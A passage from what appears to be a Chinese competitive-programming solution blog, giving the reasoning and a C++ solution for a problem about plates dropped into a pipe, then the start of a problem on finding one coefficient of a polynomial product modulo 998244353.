encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>r</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>r</mi><mi>n</mi></msub><mo stretchy="false">(</mo><mn>1</mn><mo lspace="0em" rspace="0em">≤</mo><msub><mi>r</mi><mi>i</mi></msub><mo lspace="0em" rspace="0em">≤</mo><mn>1000000000</mn><mo separator="true">,</mo><mn>1</mn><mo lspace="0em" rspace="0em">≤</mo><mi>i</mi><mo lspace="0em" rspace="0em">≤</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">r_1, r_2,...,r_n ( 1 {\leq}r_i{\leq} 1 000 000 000 ,1{\leq}i{\leq}n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mord"><span class="mrel">≤</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mrel">≤</span></span><span class="mord">1000000000</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mord"><span class="mrel">≤</span></span><span class="mord mathnormal">i</span><span class="mord"><span class="mrel">≤</span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 表示水管从上到下所有圆筒的直径。第三行给出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>k</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>k</mi><mi>m</mi></msub><mo stretchy="false">(</mo><mn>1</mn><mo lspace="0em" rspace="0em">≤</mo><msub><mi>k</mi><mi>j</mi></msub><mo lspace="0em" rspace="0em">≤</mo><mn>1000000000</mn><mo separator="true">,</mo><mn>1</mn><mo lspace="0em" rspace="0em">≤</mo><mi>j</mi><mo lspace="0em" rspace="0em">≤</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k_1, k_2,..., k_m ( 1{\leq} k_j{\leq} 1 000 000 000,1{\leq}j{\leq} m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mord"><span class="mrel">≤</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord"><span class="mrel">≤</span></span><span class="mord">1000000000</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mord"><span class="mrel">≤</span></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord"><span class="mrel">≤</span></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span> 分别表示 lxy 依次扔下去的盘子直径。</p><h3 id="输出描述-4">输出描述:</h3><p>一个整数输出最后一个盘子掉在了哪一层，如果盘子不能扔进水管,那么打印0。</p><h3 id="题解复现-4">题解复现</h3><blockquote><ol><li>如果盘子比圆筒多，无论如何都会超出，因此可直接输出 0 结束。</li><li>如果存在比第一层宽的盘子，则无论如何都会超出，因此同样可直接输出 0 结束。</li><li>若上方圆筒比下方小，则下方圆筒直径对盘子无影响，可认为与上方等径。</li><li>盘子与圆筒逐个遍历即可，题目不涉及复杂算法，但逻辑关系较为严谨。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> m, n;  <span class="comment">//n是圆筒层数，m是盘子总数</span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> r[<span class="number">300010</span>], k[<span class="number">300010</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="comment">//实测这两句能让效率提升不少</span></span><br><span class="line"></span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt; <span class="number">0</span>; i--) cin &gt;&gt; r[i];</span><br><span class="line">    <span class="comment">//便于从底端开始</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) cin &gt;&gt; k[i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &lt; m) &#123;</span><br><span class="line">cout &lt;&lt; <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line"><span class="keyword">if</span> (k[i] &gt; r[n]) &#123;</span><br><span class="line">cout &lt;&lt; <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt; <span class="number">1</span>; i--) &#123;</span><br><span class="line"><span class="keyword">if</span> (r[i] &lt; r[i - <span class="number">1</span>]) r[i - <span class="number">1</span>] = r[i];</span><br><span class="line">        <span class="comment">//圆筒整形，统一向蛇精脸发展</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = x; j &lt;= n; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (r[j] &gt;= k[i]) &#123;</span><br><span class="line">x = j + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (x &gt; n) &#123;</span><br><span class="line">cout &lt;&lt; <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; n - x + <span class="number">2</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-ACE-的多项式">E. ACE 的多项式</h2><h3 id="题目描述-5">题目描述</h3><p>设P(x)和Q(x)为关于x的多项式：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow><mi>n</mi></msubsup><mrow><msub><mi>a</mi><mi>i</mi></msub><msup><mi>x</mi><mi>i</mi></msup></mrow><mo separator="true">,</mo><mi>Q</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow><mi>m</mi></msubsup><mrow><msub><mi>b</mi><mi>i</mi></msub><msup><mi>x</mi><mi>i</mi></msup></mrow></mrow><annotation encoding="application/x-tex">P(x) = \sum_{i = 0}^{n}{a_{i}x^{i}},  Q(x) = \sum_{i = 0}^{m}{b_{i}x^{i}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1244em;vertical-align:-0.2997em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1244em;vertical-align:-0.2997em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span></span></span></span></span></span></span></span></span></p><p>则有，将两个多项式相乘可得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mi>Q</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>n</mi><mo>+</mo><mi>m</mi></mrow></msubsup><mrow><mo stretchy="false">(</mo><mi>a</mi><mo>∗</mo><mi>b</mi><msub><mo stretchy="false">)</mo><mi>i</mi></msub><msup><mi>x</mi><mi>i</mi></msup></mrow></mrow><annotation encoding="application/x-tex">P(x)Q(x) = \sum_{i = 0}^{n + m}{(a*b)_{i}x^{i}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2109em;vertical-align:-0.2997em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9112em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">b</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span></span></span></span></span></span></span></span></span> 其中 * 表示卷积运算，现在给出一个整数k，ACE请你计算出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>a</mi><mo>∗</mo><mi>b</mi><msub><mo stretchy="false">)</mo><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">(a*b)_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ，那么由于这个数可能会很大，只需要求出其除以998244353的余数。</p><p>提示：也就是说两个多项式相乘，我们给出其 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">x_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的系数，那么我们就只需要 for 一遍，ans =  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>所有</mtext><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo>∗</mo><msub><mi>b</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mtext>满足</mtext><mi>i</mi><mo>+</mo><mi>j</mi><mo>=</mo><mi>k</mi><mo stretchy="false">)</mo><mtext>的和</mtext></mrow><annotation encoding="application/x-tex">所有(a_{i} * b_{j})(满足i + j = k)的和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">所有</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord cjk_fallback">满足</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mord cjk_fallback">的和</span></span></span></span> ，关于求余数，就是取模运算， <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mo>∗</mo><msub><mi>b</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">a_{i}*b_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6153em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 处的 * 是乘法运算。</p><p>x,y两个数相加求余数就是ans = ( x +ｙ）％998244353；</p><p>x,y两个数相乘求余数就是ans = (1ll *x * y)％998244353；</p><p>乘上1ll ，防止爆int ，或者你可以使用自己的方法。</p><p>建议多取模，建议用long long .</p><h3 id="输入描述-5">输入描述:</h3><p>第一行输入一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>1000000</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n, ( 1 \leq n \leq 1000000 )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1000000</span><span class="mclose">)</span></span></span></span><br>第二行输入n+1个整数，代表 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mo 